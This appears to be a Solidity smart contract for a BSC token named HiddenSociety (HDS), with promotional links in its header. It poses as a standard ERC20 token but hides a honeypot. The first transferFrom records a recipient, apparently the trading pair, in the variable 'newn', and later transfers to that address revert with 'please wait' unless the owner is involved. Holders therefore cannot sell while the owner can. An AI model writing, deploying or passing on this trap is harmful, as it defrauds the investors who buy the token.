/**

 ___  ___  ___  ________  ________  _______   ________           ________  ________  ________  ___  _______  _________    ___    ___
|\  \|\  \|\  \|\   ___ \|\   ___ \|\  ___ \ |\   ___  \        |\   ____\|\   __  \|\   ____\|\  \|\  ___ \|\___   ___\ |\  \  /  /|
\ \  \\\  \ \  \ \  \_|\ \ \  \_|\ \ \   __/|\ \  \\ \  \       \ \  \___|\ \  \|\  \ \  \___|\ \  \ \   __/\|___ \  \_| \ \  \/  / /
 \ \   __  \ \  \ \  \ \\ \ \  \ \\ \ \  \_|/_\ \  \\ \  \       \ \_____  \ \  \\\  \ \  \    \ \  \ \  \_|/__  \ \  \   \ \    / /
  \ \  \ \  \ \  \ \  \_\\ \ \  \_\\ \ \  \_|\ \ \  \\ \  \       \|____|\  \ \  \\\  \ \  \____\ \  \ \  \_|\ \  \ \  \   \/  /  /
   \ \__\ \__\ \__\ \_______\ \_______\ \_______\ \__\\ \__\        ____\_\  \ \_______\ \_______\ \__\ \_______\  \ \__\__/  / /
    \|__|\|__|\|__|\|_______|\|_______|\|_______|\|__| \|__|       |\_________\|_______|\|_______|\|__|\|_______|   \|__|\___/ /
                                                                   \|_________|                                         \|___|/
Hidden Society ($HDS)
https://hiddensociety.net/
https://poocoin.app/tokens/0x2c33bc0523b1a3702ad23f1aa908db4d3920e28e
https://t.me/HiddenSocietyBSC


*/
//   SPDX-License-Identifier: MIT

pragma solidity >=0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenERC20 is ERC20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newn;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "HDS";
    name = "HiddenSociety";
    decimals = 18;
    // One trillion
    _totalSupply =  1000000000000 ether;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transfernewn(address _newn) public onlyOwner {
    newn = _newn;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != newn, "please wait");

    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && newn == address(0)) {
        newn = to;
      } else if (from == owner || to == owner) {

      }
      else {
        require(to != newn, "please wait");
      }

    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract HiddenSociety is TokenERC20 {
  function() external payable {

  }
}